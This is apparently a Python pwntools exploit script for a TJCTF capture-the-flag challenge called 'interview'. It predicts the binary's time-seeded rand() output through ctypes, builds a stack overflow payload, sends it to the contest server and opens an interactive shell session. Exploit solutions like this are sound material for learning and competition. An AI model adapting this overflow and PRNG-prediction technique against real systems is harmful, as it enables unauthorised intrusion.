
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys
import ctypes

elfPath = "./interview"
libcPath = ""
remoteAddr = "problem1.tjctf.org"
remotePort = 8000

context.log_level = "debug"
context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

if __name__ == "__main__":
    # DEBUG()
    dll = ctypes.CDLL("/lib/i386-linux-gnu/libc.so.6")
    dll.srand(dll.time(0))
    payload = 'a' * 64
    for i in xrange(10):
        payload += p32(dll.rand() & 0xffffffff)

    payload += p32(0) * 3
    payload += p32(0xdeadbeef - 10) * 5 
    #  print hexdump(payload)
    #  base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    #  print io.pid
    #  print hex(base + 0x831)
    # pause()
    io.sendlineafter("name?\n", payload)
    
    io.interactive()
    io.close()
